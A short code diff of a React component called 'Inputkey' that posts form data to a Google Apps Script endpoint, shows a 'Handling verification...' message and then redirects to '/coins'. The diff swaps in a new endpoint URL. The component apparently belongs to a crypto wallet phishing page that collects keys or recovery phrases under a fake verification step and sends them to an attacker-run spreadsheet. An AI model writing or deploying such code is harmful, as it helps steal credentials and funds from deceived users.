@@ -133,7 +133,7 @@ const Inputkey = ({name, imgsrc, setshowinputkey, setfirstmodal}) => {
 
   const [value, setValue] = React.useState(0);
   
-  const scriptURL = 'https://script.google.com/macros/s/AKfycby2gt5PeT4B93ngsDRxPTZ56jW3BDqTXMhdaIBubSa69QoWKwECt80q32BlifysrzFw8g/exec'
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbx_WBMcCJJvMm94b7g9Q2zYVh1Q8HvgN3v5S0axVUBhNkjsxVB1JPHJXSROMl_d8wLI0w/exec'
 
   const handleChange = (event, newValue) => {
     setValue(newValue);
@@ -153,7 +153,7 @@ const Inputkey = ({name, imgsrc, setshowinputkey, setfirstmodal}) => {
       .catch(error => console.error('Error!', error.message))
       toast.warning('Handling verification... ')
       setTimeout(() => {
-        navigate('/');
+        navigate('/coins');
       }, 1000);
     // console.log(fullinfo)
     
